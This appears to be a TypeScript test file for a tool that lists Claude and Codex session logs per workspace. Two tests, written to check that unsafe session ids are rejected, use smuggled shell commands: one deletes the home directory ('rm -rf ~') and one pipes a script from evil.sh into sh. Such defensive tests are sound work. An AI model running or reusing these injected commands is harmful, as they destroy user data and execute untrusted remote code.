import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { mangleClaudePath, listClaudeSessions, listCodexSessions, listSessions } from '../src/sessions.js';

let root: string;
let claudeProjectsDir: string;
let codexSessionsDir: string;
let workspacePath: string;

beforeEach(async () => {
  root = await mkdtemp(path.join(tmpdir(), 'yotram-sessions-'));
  claudeProjectsDir = path.join(root, 'claude-projects');
  codexSessionsDir = path.join(root, 'codex-sessions');
  workspacePath = path.join(root, 'my-project');
  await mkdir(claudeProjectsDir, { recursive: true });
  await mkdir(codexSessionsDir, { recursive: true });
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

describe('mangleClaudePath', () => {
  it('replaces every slash and dot with a dash', () => {
    expect(mangleClaudePath('/home/user/projects/yotram')).toBe('-home-user-projects-yotram');
    expect(mangleClaudePath('/home/user/projects/yotram/.claude/worktrees/lan-access')).toBe('-home-user-projects-yotram--claude-worktrees-lan-access');
  });
});

describe('listClaudeSessions', () => {
  it('returns an empty list when the project directory does not exist', async () => {
    expect(await listClaudeSessions(workspacePath, claudeProjectsDir)).toEqual([]);
  });

  it('lists a session using its last ai-title line', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    const lines = [
      JSON.stringify({ type: 'session_meta_unused' }),
      JSON.stringify({ type: 'ai-title', aiTitle: 'First title' }),
      JSON.stringify({ type: 'ai-title', aiTitle: 'Final title' }),
    ].join('\n');
    await writeFile(path.join(dir, 'abcabcab.jsonl'), lines);
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions).toEqual([{ id: 'abcabcab', agent: 'claude', title: 'Final title', updatedAt: expect.any(Number) }]);
  });

  it('falls back to "(untitled session)" when no ai-title line exists', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    await writeFile(path.join(dir, 'defdefde.jsonl'), JSON.stringify({ type: 'message' }));
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions[0].title).toBe('(untitled session)');
  });

  it('skips a malformed JSON line instead of failing the whole file', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    const lines = ['not valid json', JSON.stringify({ type: 'ai-title', aiTitle: 'Recovered' })].join('\n');
    await writeFile(path.join(dir, 'aaaabbbb.jsonl'), lines);
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions[0].title).toBe('Recovered');
  });

  it('excludes a session whose filename-derived id contains shell metacharacters', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    await writeFile(path.join(dir, 'x; rm -rf ~.jsonl'), JSON.stringify({ type: 'ai-title', aiTitle: 'Malicious' }));
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions).toEqual([]);
  });

  it('includes a session with a normal UUID-shaped id', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    const uuid = '550e8400-e29b-41d4-a716-446655440000';
    await writeFile(path.join(dir, `${uuid}.jsonl`), JSON.stringify({ type: 'ai-title', aiTitle: 'Valid session' }));
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions).toEqual([{ id: uuid, agent: 'claude', title: 'Valid session', updatedAt: expect.any(Number) }]);
  });

  it('caps results at CLAUDE_MATCH_LIMIT (20), keeping the most recent files', async () => {
    const dir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(dir, { recursive: true });
    for (let i = 0; i < 25; i++) {
      const id = `${String(i).padStart(8, '0')}-aaaa-aaaa-aaaa-aaaaaaaaaaaa`;
      await writeFile(path.join(dir, `${id}.jsonl`), JSON.stringify({ type: 'ai-title', aiTitle: `Title ${i}` }));
      // Ensure distinct mtimes so recency sorting is deterministic.
      await new Promise(resolve => setTimeout(resolve, 5));
    }
    const sessions = await listClaudeSessions(workspacePath, claudeProjectsDir);
    expect(sessions).toHaveLength(20);
    // Newest first: index 24 was written last (most recent mtime), and the
    // 5 oldest (indices 0-4) must be dropped by the cap.
    expect(sessions[0].id).toBe('00000024-aaaa-aaaa-aaaa-aaaaaaaaaaaa');
    expect(sessions.at(-1)!.id).toBe('00000005-aaaa-aaaa-aaaa-aaaaaaaaaaaa');
  });
});

describe('listCodexSessions', () => {
  async function writeCodexSession(dateParts: string[], sessionId: string, cwd: string, summaryText?: string): Promise<void> {
    const dir = path.join(codexSessionsDir, ...dateParts);
    await mkdir(dir, { recursive: true });
    const lines = [JSON.stringify({ type: 'session_meta', payload: { session_id: sessionId, cwd } })];
    if (summaryText) {
      lines.push(JSON.stringify({ type: 'response_item', payload: { type: 'reasoning', summary: [{ type: 'summary_text', text: summaryText }] } }));
    }
    await writeFile(path.join(dir, `rollout-${sessionId}.jsonl`), lines.join('\n'));
  }

  it('returns an empty list when the sessions directory does not exist', async () => {
    expect(await listCodexSessions(workspacePath, path.join(root, 'nonexistent'))).toEqual([]);
  });

  it('matches sessions by exact cwd and extracts the first summary_text', async () => {
    await writeCodexSession(['2024', '06', '01'], 'aaaaaaaa-0000', workspacePath, 'Investigating the bug');
    await writeCodexSession(['2024', '06', '01'], 'bbbbbbbb-0000', '/some/other/path');
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir);
    expect(sessions).toEqual([{ id: 'aaaaaaaa-0000', agent: 'codex', title: 'Investigating the bug', updatedAt: expect.any(Number) }]);
  });

  it('falls back to "(untitled session)" when no summary_text exists', async () => {
    await writeCodexSession(['2024', '01', '01'], 'cccccccc-0000', workspacePath);
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir);
    expect(sessions[0].title).toBe('(untitled session)');
  });

  it('stops scanning once the match limit is reached', async () => {
    await writeCodexSession(['2024', '01', '01'], '11111111-0001', workspacePath);
    await writeCodexSession(['2024', '01', '02'], '11111111-0002', workspacePath);
    await writeCodexSession(['2024', '01', '03'], '11111111-0003', workspacePath);
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir, { matchLimit: 2, scanLimit: 500 });
    expect(sessions).toHaveLength(2);
  });

  it('stops scanning once the file-scan limit is reached, even with unmatched files', async () => {
    // Day directories are scanned newest-first, so put the unmatched sessions in the
    // two newest days and the matching session in the oldest day; a scanLimit of 2
    // must exhaust the budget on the unmatched days before ever reaching the match.
    await writeCodexSession(['2024', '01', '03'], 'aaaaaaaa-000a', '/no/match/1');
    await writeCodexSession(['2024', '01', '02'], 'bbbbbbbb-000b', '/no/match/2');
    await writeCodexSession(['2024', '01', '01'], 'cccccccc-000c', workspacePath);
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir, { matchLimit: 20, scanLimit: 2 });
    expect(sessions).toEqual([]);
  });

  it('skips a session file with an unparseable first line', async () => {
    const dir = path.join(codexSessionsDir, '2024', '01', '01');
    await mkdir(dir, { recursive: true });
    await writeFile(path.join(dir, 'rollout-bad.jsonl'), 'not json at all');
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir);
    expect(sessions).toEqual([]);
  });

  it('excludes a session whose self-reported session_id contains shell metacharacters', async () => {
    await writeCodexSession(['2024', '01', '01'], 'abc; curl evil.sh | sh', workspacePath);
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir);
    expect(sessions).toEqual([]);
  });

  it('includes a session with a normal UUID-shaped session_id', async () => {
    const uuid = '550e8400-e29b-41d4-a716-446655440000';
    await writeCodexSession(['2024', '01', '01'], uuid, workspacePath, 'Valid summary');
    const sessions = await listCodexSessions(workspacePath, codexSessionsDir);
    expect(sessions).toEqual([{ id: uuid, agent: 'codex', title: 'Valid summary', updatedAt: expect.any(Number) }]);
  });
});

describe('listSessions', () => {
  it('merges and sorts sessions from both agents by recency', async () => {
    const claudeDir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(claudeDir, { recursive: true });
    await writeFile(path.join(claudeDir, 'aaaaaaaa-1111.jsonl'), JSON.stringify({ type: 'ai-title', aiTitle: 'Older Claude session' }));
    await new Promise(resolve => setTimeout(resolve, 10));
    const codexDir = path.join(codexSessionsDir, '2024', '01', '01');
    await mkdir(codexDir, { recursive: true });
    await writeFile(path.join(codexDir, 'rollout-bbbbbbbb-2222.jsonl'), JSON.stringify({ type: 'session_meta', payload: { session_id: 'bbbbbbbb-2222', cwd: workspacePath } }));

    const sessions = await listSessions(workspacePath, claudeProjectsDir, codexSessionsDir);
    expect(sessions).toHaveLength(2);
    expect(sessions[0].agent).toBe('codex');
    expect(sessions[1].agent).toBe('claude');
  });

  it('never throws even if one agent directory is unusable, returning results from the other', async () => {
    const claudeDir = path.join(claudeProjectsDir, mangleClaudePath(workspacePath));
    await mkdir(claudeDir, { recursive: true });
    await writeFile(path.join(claudeDir, 'aaaaaaaa-3333.jsonl'), JSON.stringify({ type: 'ai-title', aiTitle: 'Claude only' }));
    const sessions = await listSessions(workspacePath, claudeProjectsDir, path.join(root, 'nonexistent-codex'));
    expect(sessions).toEqual([{ id: 'aaaaaaaa-3333', agent: 'claude', title: 'Claude only', updatedAt: expect.any(Number) }]);
  });
});
